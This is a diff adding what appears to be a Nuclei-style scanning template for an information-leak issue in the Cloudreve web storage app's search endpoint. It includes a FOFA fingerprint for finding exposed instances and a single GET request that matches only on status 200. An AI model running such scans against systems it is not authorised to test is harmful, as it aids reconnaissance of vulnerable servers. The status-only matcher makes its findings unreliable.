@@ -1,0 +1,21 @@
+id: poc-gzgu2x8zdhre0s0o
+info:
+  name: cloudreve网盘search存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gzgu2x8zdhre0s0o'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gzgu2x8zdhre0s0o
+    fofa: icon_hash=="273548428"
+http:
+- raw:
+  - 'GET /search?keywords=a HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
